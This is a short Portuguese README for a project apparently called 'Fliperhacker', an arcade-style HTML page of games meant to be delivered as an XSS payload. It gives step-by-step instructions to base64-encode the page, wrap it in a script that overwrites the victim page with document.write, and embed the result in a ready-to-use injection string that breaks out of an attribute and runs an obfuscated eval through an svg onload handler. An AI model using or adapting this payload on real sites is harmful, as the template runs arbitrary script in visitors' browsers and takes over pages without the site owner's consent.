# Fliperhacker
Uma simples página em html  estilo fliperama feita para jogar  alguns dos games que fizemos  em forma de payload para XSS.

! Para tornar este index.html em um payload, não se esqueça de: 

*Encodar ela em base 64. colar o resultado do base64 aqui

	document.addEventListener("DOMContentLoaded", function(event) {

    var pocpage = "base64 aqui";

    document.open();

    document.write(atob(pocpage));

    document.close();
    });;
    
Após isso, refaça o encode desse código js e cole o resultado aqui
 
 "><svg/onload=window[490837..toString(1<<5)](atob('o que fica aqui dentro deverá ser decodificado em base64'))>xui.vm"
 
 e estará pronto para ser usado :)
